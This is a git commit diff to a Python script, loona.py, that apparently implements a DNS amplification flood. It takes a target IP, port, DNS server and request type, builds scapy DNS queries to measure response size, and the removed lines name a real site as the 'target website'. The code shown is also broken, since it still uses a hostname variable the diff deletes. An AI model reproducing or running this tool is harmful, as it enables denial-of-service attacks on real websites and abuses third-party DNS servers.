e81c6635fe834c8a1da25c52630e18cdc342b256
karan <179626329+k4ran909@users.noreply.github.com>
2026-09-16 18:48:58 +0530

    Update loona.py

--- loona.py
+++ loona.py
@@ -3,18 +3,9 @@ import time
 import sys
 import socket
 
-   if len(sys.argv) < 5:
-       print("Usage: python3 <program> TARGET_IP TARGET_PORT DNS_SERVER REQUEST_TYPE(ALL CAPS)")
-       sys.exit()
-
-   try:
-       # Resolve the IP address of the target website
-       hostname = 'loonacampus.com'
-       target_ip = socket.gethostbyname(hostname)
-       print(f"Resolved IP address: {target_ip}")
-   except socket.error as e:
-       print(f"Error resolving hostname: {e}")
-       sys.exit()
+if len(sys.argv) < 5:
+    print("Usage: python3 <program> TARGET_IP TARGET_PORT DNS_SERVER REQUEST_TYPE(ALL CAPS)")
+    sys.exit()
 
    # Construct the initial DNS query to calculate the response size
    dns_req = IP(dst=sys.argv[3]) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=hostname, qtype='SOA'))
